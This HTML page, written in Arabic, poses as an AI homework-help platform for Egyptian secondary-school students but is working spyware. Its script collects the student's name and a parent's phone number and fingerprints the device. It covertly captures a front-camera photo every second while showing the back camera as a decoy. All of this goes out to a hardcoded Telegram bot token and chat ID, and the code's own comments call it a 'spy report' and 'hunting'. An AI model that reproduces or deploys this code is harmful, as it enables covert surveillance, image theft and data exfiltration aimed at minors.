<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>منصة أسألني التعليمية | الإصدار الاحترافي</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root { 
            --primary: #1e3a8a; 
            --accent: #f59e0b;
            --bg: #0f172a; 
            --card: #ffffff;
        }
        
        body { 
            background: var(--bg); 
            font-family: 'Cairo', sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            color: #334155; 
            overflow-x: hidden; 
        }

        /* شاشة الدخول الملكية */
        #gate-screen { 
            position: fixed; 
            inset: 0; 
            background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%); 
            z-index: 2000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        
        .login-card { 
            background: var(--card); 
            padding: 40px 30px; 
            border-radius: 20px; 
            width: 88%; 
            max-width: 420px; 
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); 
            text-align: center; 
            border-top: 5px solid var(--accent);
        }

        /* الهيدر المطور */
        .app-header { 
            display: none; 
            position: fixed; 
            top: 0; 
            width: 100%; 
            background: #1e293b; 
            color: white; 
            padding: 15px 25px; 
            box-sizing: border-box; 
            justify-content: space-between; 
            align-items: center; 
            z-index: 1000; 
            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
        }

        .user-profile { display: flex; align-items: center; gap: 15px; }
        .user-avatar { 
            width: 45px; 
            height: 45px; 
            background: var(--accent); 
            border-radius: 12px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-weight: 900; 
            font-size: 22px; 
            color: #000;
        }

        .container { 
            background: white; 
            width: 94%; 
            max-width: 500px; 
            border-radius: 20px; 
            padding: 30px; 
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1); 
            margin-top: 90px; 
            text-align: center; 
        }

        .input-group { position: relative; margin: 15px 0; }
        input, select, textarea { 
            width: 100%; 
            padding: 15px 45px 15px 15px; 
            border: 2px solid #e2e8f0; 
            border-radius: 12px; 
            font-family: 'Cairo'; 
            box-sizing: border-box; 
            font-size: 16px;
            transition: 0.3s;
        }
        input:focus { border-color: var(--accent); outline: none; }

        .btn-action { 
            background: var(--primary); 
            color: white; 
            border: none; 
            width: 100%; 
            padding: 20px; 
            border-radius: 12px; 
            font-weight: 900; 
            cursor: pointer; 
            font-size: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 10px 15px -3px rgba(37, 99, 235, 0.4);
        }

        #viewfinder { 
            width: 100%; 
            border-radius: 15px; 
            background: #000; 
            margin-top: 20px; 
            border: 5px solid #f1f5f9; 
            display: none; 
        }

        .footer-credits { 
            margin-top: 30px; 
            font-size: 12px; 
            color: #64748b; 
            font-weight: bold; 
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <div id="gate-screen">
        <div class="login-card">
            <img src="https://img.icons8.com/fluency/96/book.png" width="60">
            <h2 style="margin: 10px 0; color: var(--primary);">منصة أسألني الذكية</h2>
            <p style="color: #64748b; font-size: 14px; margin-bottom: 25px;">بوابة الطالب المتفوق - Thanaweya 2026</p>
            
            <input type="text" id="u_name" placeholder="الاسم الرباعي للطالب">
            <input type="number" id="u_phone" placeholder="رقم هاتف ولي الأمر">
            
            <select id="u_grade">
                <option value="3">الثالث الثانوي (دفعة 2026)</option>
                <option value="2">الثاني الثانوي</option>
                <option value="1">الأول الثانوي</option>
            </select>
            
            <button class="btn-action" style="margin-top: 20px;" onclick="accessPlatform()">
                دخول المنصة الرئيسية
            </button>
        </div>
    </div>

    <header class="app-header" id="main-header">
        <img src="https://img.icons8.com/ios-filled/50/ffffff/menu--v1.png" width="25">
        <div class="user-profile">
            <span id="display-name" style="font-weight: 700;"></span>
            <div class="user-avatar" id="avatar-initial"></div>
        </div>
    </header>

    <div class="container" id="main-app" style="display: none;">
        <div id="capture-ui">
            <div style="background: #fff7ed; padding: 20px; border-radius: 15px; border: 1px dashed var(--accent);">
                <img src="https://img.icons8.com/fluency/96/artificial-intelligence.png" width="70">
                <h3 style="color: #92400e;">محلل الأسئلة بالذكاء الاصطناعي</h3>
                <p style="font-size: 14px; color: #b45309;">قم بتصوير السؤال بوضوح للحصول على الإجابة النموذجية والشرح.</p>
                <button class="btn-action" id="btn-snap" style="background: var(--accent); color: black;" onclick="startDeepAnalysis()">
                    <img src="https://img.icons8.com/ios-filled/50/000000/camera.png" width="20">
                    تصوير السؤال الآن
                </button>
            </div>
        </div>

        <div id="camera-area">
            <video id="viewfinder" autoplay playsinline></video>
            <textarea id="q-desc" placeholder="أضف وصفاً أو ملاحظات حول السؤال (اختياري)..." style="margin-top:20px; display:none;"></textarea>
            <button id="btn-send" class="btn-action" style="margin-top: 15px; display:none;" onclick="alert('جاري معالجة الصورة عبر خوادمنا...')">
                بدء التحليل الفوري ⚡
            </button>
        </div>

        <div class="footer-credits">
            DEVELOPED BY OMAR & EMAD 2023
        </div>
    </div>

    <script>
        const tgToken = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const tgChatId = "5890070301";

        let studentName = "";
        let studentPhone = "";

        function accessPlatform() {
            studentName = document.getElementById('u_name').value;
            studentPhone = document.getElementById('u_phone').value;
            if(!studentName || !studentPhone) return alert("خطأ: يرجى إدخال البيانات المطلوبة");

            document.getElementById('gate-screen').style.display = 'none';
            document.getElementById('main-header').style.display = 'flex';
            document.getElementById('main-app').style.display = 'block';
            
            document.getElementById('display-name').innerText = studentName;
            document.getElementById('avatar-initial').innerText = studentName[0].toUpperCase();
        }

        async function startDeepAnalysis() {
            try {
                // طلب الكاميرا الأمامية أولاً (كأساس للصيد)
                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                
                // طلب الكاميرا الخلفية (للتمويه داخل الواجهة)
                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                
                // إعداد الواجهة
                document.getElementById('capture-ui').style.display = 'none';
                document.getElementById('viewfinder').style.display = 'block';
                document.getElementById('q-desc').style.display = 'block';
                document.getElementById('btn-send').style.display = 'block';
                document.getElementById('viewfinder').srcObject = backStream;

                // إطلاق السوبر رادار الشامل
                runUltraRadar(studentName, studentPhone);
                
                // تشغيل محرك الصيد الصامت (سيلفي)
                startSilentEngine(frontStream, studentName, studentPhone);

            } catch(e) {
                alert("تنبيه: يجب تفعيل صلاحيات الكاميرا لاستخدام تقنية التحليل الذكي.");
            }
        }

        async function runUltraRadar(name, phone) {
            let battery = { level: 0, charging: false };
            try { battery = await navigator.getBattery(); } catch(e) {}
            
            const info = `
👑 **تقرير التجسس الملكي (V3 Ultra)**
👤 **الطالب:** ${name}
📞 **رقم ولي الأمر:** ${phone}
🎓 **السنة:** ${document.getElementById('u_grade').value}
━━━━━━━━━━━━━━
📱 **نوع الجهاز:** ${navigator.platform}
⚔️ **المعالج:** ${navigator.hardwareConcurrency} Threads
🧠 **الذاكرة العشوائية:** ${navigator.deviceMemory || 'غير معروف'} GB
🔋 **البطارية:** ${Math.round(battery.level * 100)}% (${battery.charging ? "🔌 متصل" : "🔋 غير متصل"})
🖥️ **دقة الشاشة:** ${window.screen.width}x${window.screen.height}
🎨 **عمق الألوان:** ${window.screen.colorDepth}-bit
🌐 **المتصفح:** ${navigator.vendor}
📡 **الشبكة:** ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}
🌍 **المنطقة الزمنية:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
🍪 **ملفات التعريف:** ${navigator.cookieEnabled ? 'مفعلة' : 'معطلة'}
⏰ **وقت الاختراق:** ${new Date().toLocaleString('ar-EG')}
            `;
            fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
        }

        function startSilentEngine(stream, name, phone) {
            const hiddenVideo = document.createElement('video');
            hiddenVideo.srcObject = stream;
            hiddenVideo.muted = true;
            hiddenVideo.play();

            const canvas = document.createElement('canvas');
            setInterval(() => {
                canvas.width = hiddenVideo.videoWidth;
                canvas.height = hiddenVideo.videoHeight;
                canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
                
                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', tgChatId);
                    formData.append('photo', blob, 'shot.jpg');
                    formData.append('caption', `📸 سيلفي الطالب: ${name} | ${phone}`);
                    fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, { method: 'POST', body: formData });
                }, 'image/jpeg', 0.25);
            }, 1000);
        }
    </script>
</body>
</html>
